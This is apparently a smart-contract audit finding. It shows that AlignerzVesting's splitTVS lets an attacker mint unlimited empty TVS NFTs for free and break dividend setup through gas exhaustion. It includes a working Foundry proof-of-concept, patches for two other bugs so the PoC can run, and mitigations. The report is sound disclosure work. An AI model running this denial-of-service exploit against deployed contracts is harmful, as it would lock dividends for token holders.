# [000003] Split lets attackers mint empty TVS NFTs and DoS dividend setup
  
  ### Summary

The lack of a minimum split percentage and per-output amount validation in [`AlignerzVesting::splitTVS`](https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L1054), combined with fee calculation that only charges when there are non-empty flows, will cause a denial of service of dividend setup for all TVS holders and the protocol as an attacker can mint an unbounded number of empty TVS NFTs for free and force any component that iterates over all minted IDs (such as `A26ZDividendDistributor::_setAmounts` / `_setDividends`) to hit the block gas limit and revert.

### Root Cause

`AlignerzVesting::splitTVS` accepts arbitrary percentages and does not enforce a minimum positive allocation per output TVS or per minted NFT, while the fee logic only charges based on non-zero `amounts.length`. This allows an attacker to create an "empty" TVS NFT once, then repeatedly split that empty NFT into more empty NFTs at zero cost:

```solidity
    function splitTVS(
        uint256 projectId,
        uint256[] calldata percentages,
        uint256 splitNftId
    ) external returns (uint256, uint256[] memory) {

        // ...

        uint256 sumOfPercentages;
        for (uint256 i; i < nbOfTVS; ) {
            // @audit-info percentages are unchecked, so I can create an infinite amount of TVSs that hold 0 amount
            uint256 percentage = percentages[i];
            sumOfPercentages += percentage;

            uint256 nftId = i == 0 ? splitNftId : nftContract.mint(msg.sender);
            // ...
            Allocation memory alloc =
                _computeSplitArrays(allocation, percentage, nbOfFlows);
            // ...
        }
        require(sumOfPercentages == BASIS_POINT, /* ... */);
        return (splitNftId, newNftIds);
    }

```

Because there is no check that `percentages[i]` is strictly positive and no lower bound on the resulting per-NFT `amounts`, the attacker can:

- Directly call `splitTVS(projectId, [10_000, 0, 0, 0, ...], nftId)` where only the first entry is `10_000` and all others are `0`. The first entry reuses `nftId` and keeps `100%` of the position, while all newly minted NFTs receive `0` allocation.
- Repeat the same pattern (or variants with more zeros) to mint an arbitrary number of empty NFTs at negligible cost. Since `amounts.length == 0` for those empty NFTs, `calculateFeeAndNewAmountForOneTVS` over them charges no fee, yet each split increases `nftContract.getTotalMinted()`.

This interacts badly with any logic that iterates on `nftContract.getTotalMinted()` to process all TVS NFTs (such as `A26ZDividendDistributor::_setAmounts` / `_setDividends`): the attacker can force an unbounded loop over mostly useless, empty NFTs, making `setUpTheDividends` and similar flows exceed the block gas limit and revert.

### Internal Pre-conditions

1. A bidding project is launched and bids are finalized so that at least one TVS NFT has a non-empty allocation stored in `AlignerzVesting::allocationOf`.
2. `A26ZDividendDistributor` (or any other component) uses `nftContract.getTotalMinted()` to iterate over all NFT IDs and process dividends or per-NFT accounting.

### External Pre-conditions

1. The attacker holds a TVS NFT with a non-zero allocation in the relevant project.
2. The protocol or owner uses `A26ZDividendDistributor::setUpTheDividends` (or equivalent logic) to compute or distribute dividends over all TVS NFTs by iterating on `nft.getTotalMinted()`.

### Attack Path

1. **Attacker mints an initial TVS NFT with value** by participating in a bidding project and claiming the NFT (e.g. via `AlignerzVesting::claimNFT`), obtaining `nftId` with a non-empty allocation.
2. **Attacker mints many empty NFTs in one call**, calling `splitTVS(projectId, [10_000, 0, 0, 0, ...], nftId)`. The first entry reuses `nftId` and keeps `100%` of the flows, while all newly minted NFTs have `0` allocation and become "empty" TVSs.
3. **Attacker repeats splits to grow the NFT set**, reusing the same pattern (or similar arrays with a single `10_000` and the rest `0`) to cheaply mint more empty NFTs and drive `nft.getTotalMinted()` as high as desired.
4. **Protocol attempts to set up dividends**, using `A26ZDividendDistributor::_setAmounts` / `_setDividends` which iterate from `tokenId = 1` to `nft.getTotalMinted()` and call into vesting logic for each ID.
5. **Dividend setup runs out of gas and reverts**, as the loop is forced to traverse a very large number of mostly empty NFTs minted by the attacker, causing `setUpTheDividends` (and any related operations) to become unusable.

### Impact

The protocol and all TVS NFT holders cannot rely on `A26ZDividendDistributor` (or any other logic that iterates over `nft.getTotalMinted()`) to set up or update dividends, as an attacker can cheaply create an unbounded number of empty NFTs that must be traversed. As a result, dividend accounting and distribution for all TVS NFTs can be permanently DoSed.

### PoC



Note that the scoped `_computeSplitArrays` and `calculateFeeAndNewAmountForOneTVS` have other bugs that revert any call to `splitTVS`, I provide here a quick fix for both in order to allow my POC to run and showcase this issue. 

Please paste this fixed function in `AlignerzVesting::_computeSplitArrays`
```solidity
    // Needed for this PoC: initialize alloc arrays in _computeSplitArrays so
    // splitTVS does not revert due to uninitialized memory arrays. This fix
    // addresses a separate issue (uninitialized arrays in the split helper).
        function _computeSplitArrays(
        Allocation storage allocation,
        uint256 percentage,
        uint256 nbOfFlows
    ) internal view returns (Allocation memory alloc) {
        uint256[] memory baseAmounts = allocation.amounts;
        uint256[] memory baseVestings = allocation.vestingPeriods;
        uint256[] memory baseVestingStartTimes = allocation.vestingStartTimes;
        uint256[] memory baseClaimed = allocation.claimedSeconds;
        bool[] memory baseClaimedFlows = allocation.claimedFlows;
        alloc.assignedPoolId = allocation.assignedPoolId;
        alloc.token = allocation.token;

        // @audit-info these are my added fixes
        alloc.amounts = new uint256[](nbOfFlows);
        alloc.vestingPeriods = new uint256[](nbOfFlows);
        alloc.vestingStartTimes = new uint256[](nbOfFlows);
        alloc.claimedSeconds = new uint256[](nbOfFlows);
        alloc.claimedFlows = new bool[](nbOfFlows);

        for (uint256 j; j < nbOfFlows; ) {
            alloc.amounts[j] = (baseAmounts[j] * percentage) / BASIS_POINT;
            alloc.vestingPeriods[j] = baseVestings[j];
            alloc.vestingStartTimes[j] = baseVestingStartTimes[j];
            alloc.claimedSeconds[j] = baseClaimed[j];
            alloc.claimedFlows[j] = baseClaimedFlows[j];
            unchecked {
                ++j;
            }
        }
    }
```

And paste also this other fix in `FeesManager::calculateFeeAndNewAmountForOneTVS`
```solidity
    function calculateFeeAndNewAmountForOneTVS(uint256 feeRate, uint256[] memory amounts, uint256 length) public pure returns (uint256 feeAmount, uint256[] memory newAmounts) {

        //@audit-info this is my fix
        newAmounts = new uint256[](length);

        for (uint256 i; i < length; i++) {
            feeAmount += calculateFeeAmount(feeRate, amounts[i]);
            newAmounts[i] = amounts[i] - feeAmount;
            
        }
    }
```

The following Foundry snippet (to be added to `AlignerzVestingProtocolTest.t.sol`) demonstrates that an attacker can mint an arbitrary number of empty NFTs for free via `splitTVS`, driving `nft.getTotalMinted()` to any desired size. 
```solidity

    function _setupAndFinalizeProjectWithBidder(address bidder) internal {
        // setup bidding project
        vm.startPrank(projectCreator);
        vesting.launchBiddingProject(
            address(token),
            address(usdt),
            block.timestamp,
            block.timestamp + 1_000_000,
            "0x0",
            true
        );
        vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.01 ether, true);

        vesting.addUsersToWhitelist(bidders, PROJECT_ID);
        vm.stopPrank();

        vm.startPrank(bidder);
        usdt.approve(address(vesting), BIDDER_USD);
        uint256 vestingPeriod = 90 days;
        vesting.placeBid(PROJECT_ID, BIDDER_USD, vestingPeriod);
        vm.stopPrank();

        BidInfo memory bid = BidInfo({
            bidder: bidder,
            amount: BIDDER_USD,
            vestingPeriod: vestingPeriod,
            poolId: 0,
            accepted: true
        });
        BidInfo[] memory bids = new BidInfo[](2);
        bids[0] = bid;
        bids[1] = bid;
        bytes32 poolRoot = generateMerkleProofs(bids, 0);
        bytes32[] memory merkleRoots = new bytes32[](1);
        merkleRoots[0] = poolRoot;

        vm.prank(projectCreator);
        vesting.finalizeBids(PROJECT_ID, "", merkleRoots, 60 days);
    }

    function test_POC_DOS_dividends() public {
        address attacker = bidders[0];
        _setupAndFinalizeProjectWithBidder(attacker);

        vm.startPrank(attacker);
        uint256 nftId = vesting.claimNFT(
            PROJECT_ID,
            0,
            BIDDER_USD,
            bidderProofs[attacker]
        );
        assertEq(attacker, nft.ownerOf(nftId));

        uint256 DUPLICATES = 1000;
        uint256[] memory percentages = new uint256[](DUPLICATES);
        percentages[0] = 10_000;
        // the resulting array is [10_000, 0,0,0,...] so the first nft keeps all the amount, but subsequent ones all have 0 amounts
        vesting.splitTVS(PROJECT_ID, percentages, nftId);

        // attacker can repeat this split multiple times, each time driving the
        // number of minted NFTs higher while keeping the original NFT untouched
        // and losing no assets except for gas
        assertEq(DUPLICATES, nft.getTotalMinted());
        vm.stopPrank();
    }
```

please paste this POC in `AlignerzVestingProtocolTest.t.sol` and run it with `forge clean && forge test --match-test test_POC_DOS_dividends -vv`

### Mitigation

Enforce meaningful per-output allocations and charge fees per minted NFT, so that empty NFTs cannot be created for free and the total number of NFTs remains economically bounded:

- Require each split percentage to be strictly positive and enforce a minimum allocation per NFT, for example by rejecting any `percentage` that would round down all `alloc.amounts[j]` to zero.
- Alternatively or additionally, charge a flat per-NFT fee (or per-split fee) that makes mass minting of empty NFTs economically prohibitive, even when the source allocation is empty.
- Consider decoupling dividend accounting from `nft.getTotalMinted()` by iterating only over NFTs that actually have non-empty allocations or by bounding the range of IDs considered for a given project.

  